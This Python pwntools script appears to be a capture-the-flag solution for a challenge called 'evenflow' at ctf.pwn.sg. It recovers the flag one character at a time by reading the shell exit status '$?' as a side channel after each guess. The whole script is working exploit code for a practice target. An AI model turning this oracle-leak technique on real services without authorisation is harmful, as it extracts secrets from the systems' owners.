from pwn import *

#context.log_level = "debug"
symbols = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"

def attempt(current):
    p = remote("ctf.pwn.sg", 1601)
    p.recvuntil("Flag: ")
    p.sendline(current + "0")
    p.recvuntil("Shell: ")
    p.sendline("$?")
    result = int(p.recvline())
    p.close()
    return chr(ord('0') + result)

def main():
    #p = process("./evenflow.py")
    current = ""

    while True:
        current += attempt(current)
        log.info("Current: %s" % current)
        if "}" in current:
            break

    log.success("Flag: %s" % current)

if __name__ == "__main__":
    main()
